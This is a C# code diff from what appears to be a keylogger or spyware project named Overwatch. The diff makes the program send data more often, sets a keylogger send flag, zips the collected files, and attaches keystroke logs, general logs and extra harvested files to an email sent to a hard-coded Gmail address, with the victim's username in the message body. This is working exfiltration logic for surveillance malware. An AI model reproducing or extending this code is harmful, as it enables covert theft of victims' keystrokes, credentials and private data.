@@ -14,14 +14,18 @@ namespace Overwatch
             {
                 while (true)
                 {
-                    System.Threading.Thread.Sleep(6000000);
+                    System.Threading.Thread.Sleep(60000);
                     if (ConnectivityChecker.CheckInternet() == true)
                     {
+                        cKeylogger.send = true;
                         MailAddress from = new MailAddress("isthechastener@gmail.com");
                         MailAddress to = new MailAddress("satiriorn@gmail.com");
                         MailMessage message = new MailMessage(from, to);
+                        cReceiveInformation.CompressionFile();
                         message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Key.txt"));
                         message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Log.txt"));
+                        message.Attachments.Add(new Attachment(appConfing.targetDirPath +"\\result.zip"));
+                        message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\GeneralApplication.txt"));
                         message.Subject = "Information";
                         message.Body = "<h2>"+cReceiveInformation.UsersName+"</h2>";
                         message.IsBodyHtml = true;
@@ -38,6 +42,7 @@ namespace Overwatch
     }
     public static class ConnectivityChecker
     {
+        public delegate void Response();
         public static bool CheckInternet()
         {
             try
@@ -60,14 +65,10 @@ namespace Overwatch
                     return true;
                 using (StreamReader sr = new StreamReader(responce.GetResponseStream()))
                 {
-                    if (sr.ReadToEnd().Equals("Microsoft NCSI"))
-                        return true;
-                    else
-                        return true;
+                    return sr.ReadToEnd().Equals("Microsoft NCSI") ? true : true;
                 }
             }
             catch{ return false;}
-
         }
     }
 }
